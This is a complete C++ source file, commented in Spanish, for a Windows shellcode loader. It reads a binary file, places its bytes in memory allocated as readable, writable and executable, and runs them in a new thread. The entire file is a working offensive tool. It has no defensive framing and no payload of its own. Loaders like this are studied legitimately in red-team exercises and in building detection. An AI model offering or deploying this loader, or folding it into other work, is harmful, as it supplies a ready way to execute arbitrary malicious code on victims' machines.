#include <windows.h>    // Para funciones de WinAPI como VirtualAlloc y CreateThread
#include <iostream>     // Para entrada/salida estándar
#include <fstream>      // Para lectura de archivos binarios
#include <cstring>      // Para memcpy

int main(int argc, char* argv[]) {
    // Verificar argumentos: Espera el path al archivo .bin como parámetro
    if (argc != 2) {
        std::cerr << "Uso: loader.exe <ruta_al_shellcode.bin>" << std::endl;
        return 1;
    }

    // Abrir el archivo binario
    std::ifstream file(argv[1], std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Error: No se pudo abrir el archivo '" << argv[1] << "'" << std::endl;
        return 1;
    }

    // Obtener el tamaño del archivo
    size_t size = static_cast<size_t>(file.tellg());
    if (size == 0) {
        std::cerr << "Error: El archivo está vacío" << std::endl;
        return 1;
    }

    // Rebobinar al inicio y leer el contenido en un buffer
    file.seekg(0, std::ios::beg);
    char* shellcode = new char[size];
    if (!file.read(shellcode, size)) {
        std::cerr << "Error: No se pudo leer el archivo" << std::endl;
        delete[] shellcode;
        return 1;
    }
    file.close();

    // Asignar memoria ejecutable (PAGE_EXECUTE_READWRITE para simplicidad)
    void* exec_mem = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == nullptr) {
        std::cerr << "Error: VirtualAlloc falló (" << GetLastError() << ")" << std::endl;
        delete[] shellcode;
        return 1;
    }

    // Copiar el shellcode a la memoria asignada
    memcpy(exec_mem, shellcode, size);

    // Limpiar el buffer original (buena práctica para seguridad)
    memset(shellcode, 0, size);
    delete[] shellcode;

    // Crear un hilo para ejecutar el shellcode
    DWORD thread_id;
    HANDLE thread_handle = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, &thread_id);
    if (thread_handle == nullptr) {
        std::cerr << "Error: CreateThread falló (" << GetLastError() << ")" << std::endl;
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Esperar a que el hilo termine (ajusta si tu shellcode no retorna)
    WaitForSingleObject(thread_handle, INFINITE);

    // Limpieza: Cerrar handle y liberar memoria
    CloseHandle(thread_handle);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    std::cout << "Shellcode ejecutado exitosamente." << std::endl;
    return 0;
}
